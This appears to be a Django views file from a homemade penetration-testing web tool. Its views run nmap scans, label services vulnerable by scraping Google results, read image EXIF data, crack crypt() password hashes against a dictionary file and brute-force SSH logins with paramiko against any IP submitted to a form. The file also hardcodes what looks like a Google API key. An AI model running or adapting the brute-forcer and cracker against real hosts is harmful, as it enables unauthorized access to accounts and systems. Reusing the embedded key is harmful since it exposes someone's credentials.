import time

from django.core.files.storage import FileSystemStorage
from django.http import HttpResponse
import os
import subprocess
import urllib3 as urllib
import json
import requests
from bs4 import BeautifulSoup
import pprint
from googleapiclient.discovery import build
import crypt
import socket
import paramiko
from django.shortcuts import render

class Services:
    def __init__(self, _name, _is_vulnerable):
        self.name = _name
        self.is_vulnerable = _is_vulnerable


# def google_query1():
#     api_key, userip = None, None
#     query = {'q': 'search google python api'}
#     referrer = "https://stackoverflow.com/q/3900610"
#
#     if userip:
#         query.update(userip=userip)
#     if api_key:
#         query.update(key=api_key)
#
#     url = 'http://ajax.googleapis.com/ajax/services/search/web?v=1.0&%s'
#
#     http = urllib.PoolManager()
#
#     request = http.request('GET', url, fields=query)
#     # request.
#     # print(request.data.decode('utf-8'))
#     # json_obj = json.load(request.data.decode('utf-8'))
#     soup = BeautifulSoup(request.data.decode('utf-8'), features="lxml")
#     print(soup)
#
#
#     # results = json_obj['responseData']['results']
#     # for r in results:
#     #     print(r['title'] + ": " + r['url'])
#
#
def google_query2(query):
    service = build("customsearch", "v1",
                    developerKey="AIzaSyCQ-XGTsv-II0OisJyKJ_cm9Qq8SM0oHhE")

    res = service.cse().list(
        q=query,
        cx='004794567022193733003:ske9qyablh0',
    ).execute()

    return res

    # soup = BeautifulSoup(res)

    # for item in res['items']:
    #     print(item['link'])

    # pprint.pprint(res)


def google_query_first_5_links(query, ):
    page = 1

    first_5_results = []

    url = 'https://www.google.co.in/search?q=' + "%20".join(query.split())
    source_code = requests.get(url)
    plain_text = source_code.text
    # print(plain_text)
    soup = BeautifulSoup(plain_text, features="html.parser")
    soup = soup.find("div", {"id": "center_col"})
    count = 1
    for link in soup.findAll('a')[:5]:
        if count <= 3:
            href = link.get('href')
            if href[:4] == "/url":
                first_5_results.append(href[7:])
            elif href[:4] == "/sea":
                first_5_results.append(href[27:])
    pprint.pprint(first_5_results)
    return first_5_results


def home(request):
    return render(request, 'testauto/index.html')


def enum_vul_services(request):
    # google_query_first_5_links("apache httpd 2.4.18 vulnerabilities")
    # return HttpResponse("Hello")
    a = subprocess.run(["nmap", "-sV", "-sT", "-A", "172.17.0.1"], stdout=subprocess.PIPE)

    output = str(a) + "<br>"
    output += str(a.returncode) + "<br>"
    # print(str(a.stdout).split('\\n'))
    # output += "</br>".join(str(a.stdout).split('\\n')) + "<br>"

    nmap_lines = str(a.stdout).split('\\n')
    # print(nmap_lines)

    services_lines = []
    not_starting_with_digit = starting_with_digit = 0
    null_lines = 0

    for line in nmap_lines:
        print(line)
        if line and line != "":
            if line[0].isdigit():
                services_lines.append(line)
                starting_with_digit += 1
            else:
                not_starting_with_digit += 1
        else:
            null_lines += 1

    print("Null lines = " + str(null_lines))

    # services_lines += str(not_starting_with_digit)
    # services_lines += str(starting_with_digit)
    # services_lines += str(null_lines)

    query = ""
    services = []

    pprint.pprint(services_lines)

    for line in services_lines:
        if line[-1] != ':':
            split_line = line.split()
            services_name = split_line[2] + "   " + " ".join(split_line[3:])
            query += services_name + " vulnerabilities"

            links = google_query_first_5_links(query)
            any_of_link_have_vul = False

            for link in links:
                if str(link).lower().__contains__("cvedetails"):
                    any_of_link_have_vul = True

            services.append(Services(services_name, any_of_link_have_vul))

    for ser in services:
        print(ser.name + "  " + str(ser.is_vulnerable))

    # HttpResponse('<br>'.join(services_lines))
    return render(request, 'testauto/index.html', {'services': services})


def testPass(cryptPass):
    salt = cryptPass[0:2]
    print(salt)
    dictFile = open('dictionary.txt', 'r')

    ret_val = ""

    for word in dictFile.readlines():
        word = word.strip('\n')
        cryptWord = crypt.crypt(word, salt)
        print(cryptWord)
        if cryptWord == cryptPass:
            ret_val += ('[+] Found Password: ' + word + '\n') + "<br>"
            return ret_val
    ret_val += ('[-] Password Not Found.\n') + "<br>"

    return ret_val


def getBanner(ip, port):
    try:
        socket.setdefaulttimeout(2)
        s = socket.socket()
        print("before connect")
        s.connect((ip, port))
        print("after connect")
        banner = s.recv(1024)
        s.close()
        return banner
    except:
        return


def canLoginToIp(ip, port):
    return getBanner(ip, port)


# def main(request):
#     response = ""
#     ports = [80, 113, 443, 843, 8008, 8010]
#
#     for port in ports:
#         # response += str(canLoginToIp('31.13.78.35', port)) + "<br>"
#         response += str(canLoginToIp('', port)) + "<br>"
#     paramiko.SSHClient()
#     return HttpResponse(response)


def weak_authentication(request):
    passFile = open('passwords.txt')

    response = ""

    for line in passFile.readlines():
        if ':' in line:
            user = line.split(':')[0]
            cryptPass = line.split(':')[1].strip(' ')
            response += ('[*] Cracking Password For: ' + user) + "<br>"
            response += testPass(cryptPass)

    return HttpResponse(response)


def cve_query(query):
    url = google_query2(query)['items'][0]['link']
    source_code = requests.get(url)
    plain_text = source_code.text
    # print(plain_text)
    soup = BeautifulSoup(plain_text, features="html.parser")
    soup = soup.find("div", {"id": "searchresults"})
    count = 1

    return "https://www.cvedetails.com" + str(soup.findAll('a')[1].get('href'))


def software_update(request):
    return HttpResponse(cve_query("Apache httpd 2.4.18"))

def main(request):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    with open('usernames.txt') as f:
        usernames = f.read().split()

    with open('passwords.txt') as f:
        passwords = f.read().split()

    username = ""
    password = ""

    found = False

    ip = request.POST['ip']
    print(ip)

    for u in usernames:
        for p in passwords:
            try:
                ssh.connect(ip, username=u, password=p)
                ssh.close()
                username = u
                password = p
                found = True
                break
            except:
                print("Failed with: " + u + " : " + p)

        if found:
            break

    if found:
        return HttpResponse("You can login on " + ip + " using username = " + username + " and password = " + password)
    else:
        return HttpResponse("Can't find")


def publicdata(request):
    if request.method == 'POST':
        name = str(request.POST['website'])
        site="https://allora.io/profile/"
        site=site+name
        name=site

        r = requests.get(name)

        plain_text = r.text

        soup = BeautifulSoup(plain_text, features="html.parser")

        # for link in soup.find_all('a'):
        #     print(link.get('href'))
        soup = soup.findAll("h4")
        b=[]
        # techs = '<span>the length is ' + str(len(soup)) + '</span>'
        for a in soup:
            b.append(a.find('a').contents[0])

        techs=b
        print(techs)

        # a = subprocess.run(["ping", "-c", "1", "-A", name], stdout=subprocess.PIPE)
        # output = str(a.stdout)
        # a = str(output)
        # b = int(a.find('('))
        # b=b+1
        # c = int(a.find(')'))
        # dddd = a[b:c]
        # print(dddd)
        return render(request, 'testauto/public_data.html', {'techs': techs})

    else:
        return render(request, 'testauto/public_data.html')


# from pyPdf import PdfFileReader
# from PIL import Image
# from PIL.ExifTags import TAGS
from PIL import Image
from PIL.ExifTags import TAGS


def metadata(request):
    if request.method == 'POST':
        # myfile = request.FILES['pic']
        # print(myfile.name)
        #
        # fs = FileSystemStorage()
        # filename = fs.save(myfile.name, myfile)
        # uploaded_file_url = fs.url(filename)
        # print(uploaded_file_url)
        i = Image.open('/home/abhishek/Desktop/testauto/media/DSC00399.jpg')
        info = i._getexif()
        # for a in info.items:
        #
        l = []
        x = {TAGS.get(tag): value for tag, value in info.items()}

        for t, v in info.items():
                l.append((TAGS.get(t), v))


        return render(request, 'testauto/public_data.html', {'techs': l})
    else:
        return render(request, 'testauto/metadata.html')




